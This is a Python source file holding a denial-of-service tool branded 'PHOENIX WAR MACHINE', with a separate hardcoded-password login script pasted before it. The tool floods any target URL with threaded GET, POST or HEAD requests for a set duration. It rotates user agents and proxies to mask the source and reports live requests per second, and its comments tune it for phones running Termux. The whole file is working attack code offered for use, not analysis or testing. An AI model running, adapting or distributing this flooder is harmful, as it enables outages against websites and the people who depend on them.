import getpass
import sys

def authenticate_user():
    # Set your custom expected credentials here
    CORRECT_USERNAME = "mysterious"
    CORRECT_PASSWORD = "phoenixrises"

    MAX_ATTEMPTS = 3

    print("--- SYSTEM LOGIN REQUIRED ---")

    for attempt in range(1, MAX_ATTEMPTS + 1):
        username_input = input("Enter Username: ").strip()
        # getpass hides the typed password characters in the terminal
        password_input = getpass.getpass("Enter Password: ")

        if username_input == CORRECT_USERNAME and password_input == CORRECT_PASSWORD:
            print("\n[+] Access Granted! Launching...")
            return True
        else:
            remaining = MAX_ATTEMPTS - attempt
            print(f"[!] Invalid credentials. Attempts remaining: {remaining}\n")

    print("[-] Access Denied. Maximum authentication attempts reached.")
    sys.exit()

# --- INTEGRATION EXAMPLE ---
if __name__ == "__main__":
    # Call the block at the very start of your script
    authenticate_user()

    # Place your actual automation / script code below this line
    print("Running secure core operations...")

import sys
import time
import random
import threading
import string
import queue
from collections import Counter
import requests

# Global counters for results
response_codes = Counter()
total_requests = 0
last_request_count = 0
counter_lock = threading.Lock()
attack_active = False

def print_banner():
    """Prints the custom ASCII art banner for the tool."""
    banner = r"""
    █▀█ █ █ █▀█ █▀▀ █▄ █ █ ▀▄▀
    █▀▀ █▀█ █▄█ ██▄ █ ▀█ █ █ █
    =========================================
    TOOL   : PHOENIX WAR MACHINE
    AUTHOR : I'M MYSTERIOUS
    CREDIT : BA_313
    =========================================
    """
    print(banner)

def load_file(filename):
    """Loads lines from a file, stripping whitespace."""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
        if not lines:
            print(f"[-] Warning: {filename} is empty.")
        return lines
    except FileNotFoundError:
        print(f"[-] Error: {filename} not found.")
        sys.exit(1)

def generate_random_payload():
    """Generates unique dynamic payloads to mimic organic data submissions."""
    key_length = random.randint(4, 10)
    val_length = random.randint(10, 30)
    rand_key = ''.join(random.choices(string.ascii_lowercase, k=key_length))
    rand_val = ''.join(random.choices(string.ascii_letters + string.digits, k=val_length))
    return {rand_key: rand_val, 'phoenix': 'attack'}

def display_live_monitor(duration):
    """Telemetry loop that monitors output without hanging the terminal session."""
    global total_requests, last_request_count, attack_active

    start_time = time.time()
    end_time = start_time + duration

    print("\n" + "="*40)
    print("           LIVE ATTACK MONITOR          ")
    print("="*40)

    # Hide terminal cursor for clean tracking UI
    sys.stdout.write("\033[?25l")
    sys.stdout.flush()

    try:
        while time.time() < end_time and attack_active:
            time.sleep(1)

            current_time = time.time()
            elapsed = int(current_time - start_time)
            remaining = max(0, duration - elapsed)

            with counter_lock:
                current_total = total_requests
                codes_snapshot = dict(response_codes)

            # Calculate instant Requests Per Second
            rps = current_total - last_request_count
            last_request_count = current_total

            sys.stdout.write(f"\r[*] Remaining: {remaining}s | Speed: {rps} RPS | Total: {current_total}\033[K\n")

            status_str = ", ".join([f"[{c}]: {cnt}" for c, cnt in sorted(codes_snapshot.items(), key=lambda x: str(x))])
            sys.stdout.write(f"\r[*] Live Status -> {status_str}\033[K")
            sys.stdout.flush()

            sys.stdout.write("\033[F")

    finally:
        sys.stdout.write("\033[?25h\n\n")
        sys.stdout.flush()

def attack_worker(job_queue, target, method, duration, user_agents, proxies):
    """Consumes jobs from a thread-safe pipeline queue to prevent Android system sticking."""
    global total_requests, attack_active

    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target

    end_time = time.time() + duration
    session = requests.Session()

    while time.time() < end_time and attack_active:
        try:
            # Check the queue for pending workloads with a short timeout to keep loops alert
            _ = job_queue.get(timeout=0.1)
        except queue.Empty:
            continue

        headers = {}
        if user_agents:
            headers['User-Agent'] = random.choice(user_agents)
        else:
            headers['User-Agent'] = 'Phoenix-WarMachine-Agent/1.0'

        proxy_config = None
        if proxies:
            px = random.choice(proxies)
            proxy_config = {'http': px, 'https': px}

        try:
            if method == 'get':
                response = session.get(target, headers=headers, proxies=proxy_config, timeout=2)
            elif method == 'post':
                payload = generate_random_payload()
                response = session.post(target, headers=headers, proxies=proxy_config, data=payload, timeout=2)
            elif method == 'head':
                response = session.head(target, headers=headers, proxies=proxy_config, timeout=2)
            else:
                job_queue.task_done()
                return

            status = response.status_code
        except requests.exceptions.RequestException:
            status = "Conn_Error"

        with counter_lock:
            total_requests += 1
            response_codes[status] += 1

        job_queue.task_done()

def main():
    global attack_active
    print_banner()

    print("[*] --- CONFIGURATION MENU ---")
    print(" 1. Run Phoenix War Machine")
    print(" 2. Exit Program")

    menu_choice = input("[+] Select an option (1-2): ").strip()
    if menu_choice == '2':
        print("[*] Closing Phoenix War Machine cleanly. Goodbye!")
        sys.exit(0)
    elif menu_choice != '1':
        print("[-] Invalid choice. Proceeding to configuration by default...\n")

    target = input("[+] Enter Target URL/IP (e.g., example.com): ").strip()
    while not target:
        target = input("[-] Target cannot be empty. Enter Target: ").strip()

    print("\nAvailable Attack Methods:")
    print(" 1. GET")
    print(" 2. POST")
    print(" 3. HEAD")
    method_choice = input("[+] Select Method (1-3): ").strip()

    if method_choice == '1':
        method = 'get'
    elif method_choice == '2':
        method = 'post'
    elif method_choice == '3':
        method = 'head'
    else:
        print("[-] Invalid selection. Defaulting to GET.")
        method = 'get'

    print("\nProxy Routing Options:")
    print(" 1. Standard (No proxies - Uses local connection safely)")
    print(" 2. Route via proxy.txt (Rotates external addresses)")
    proxy_choice = input("[+] Choose proxy setting (1-2) [Default: 1]: ").strip()

    proxies = None
    if proxy_choice == '2':
        print("[*] Initializing proxy configuration list...")
        proxies = load_file("proxy.txt")
    else:
        print("[*] Safety configuration kept: Running directly from local connection.")

    try:
        print("")
        duration = int(input("[+] Enter Duration (Time in seconds): "))

        print("[i] Recommendation: Use 20-50 execution threads on mobile environments.")
        thread_count = int(input("[+] Enter Active Threads Pool (e.g., 30): "))

        # User input configured with optimized 500 default fallback
        workers_input = input("[+] Enter Workload Multiplier [Default: 500]: ").strip()
        if workers_input == "":
            workload_capacity = 500
        else:
            workload_capacity = int(workers_input)

    except ValueError:
        print("\n[-] Error: Time, threads, and multipliers must be valid numbers.")
        sys.exit(1)

    user_agents = load_file("user-agent.txt")
    attack_active = True

    # Use a thread-safe FIFO Queue to hold jobs instead of spawning naked threads
    job_queue = queue.Queue()

    # Pre-fill the execution queue to prime the machine pipelines
    total_initial_jobs = thread_count * workload_capacity
    for _ in range(total_initial_jobs):
        job_queue.put(True)

    # Spin up optimized line monitor telemetry
    monitor_thread = threading.Thread(target=display_live_monitor, args=(duration,))
    monitor_thread.daemon = True
    monitor_thread.start()

    # Launch fixed thread pool structures that won't strain Termux resources
    for _ in range(thread_count):
        t = threading.Thread(
            target=attack_worker,
            args=(job_queue, target, method, duration, user_agents, proxies)
        )
        t.daemon = True
        t.start()

    # Independent loop that keeps refueling the queue dynamically as workers consume tasks
    start_time = time.time()
    try:
        while time.time() < (start_time + duration) and attack_active:
            # Maintain a stable baseline of tasks in the pipeline without overwhelming RAM
            if job_queue.qsize() < (thread_count * 2):
                for _ in range(thread_count * 5):
                    job_queue.put(True)
            time.sleep(0.02)  # Highly sensitive update interval to match the 500 capacity pump rate
    except KeyboardInterrupt:
        pass
    finally:
        attack_active = False

    time.sleep(1.1)

    print("="*40)
    print("         PHOENIX WAR MACHINE RESULTS         ")
    print("="*40)
    print(f"Total Requests Sent : {total_requests}")
    print("-"*40)
    print("Network Code / Status Distribution:")

    for code, count in sorted(response_codes.items(), key=lambda x: str(x)):
        print(f"  Code {code} : {count} occurrences")
    print("="*40)

if __name__ == "__main__":
    main()
    
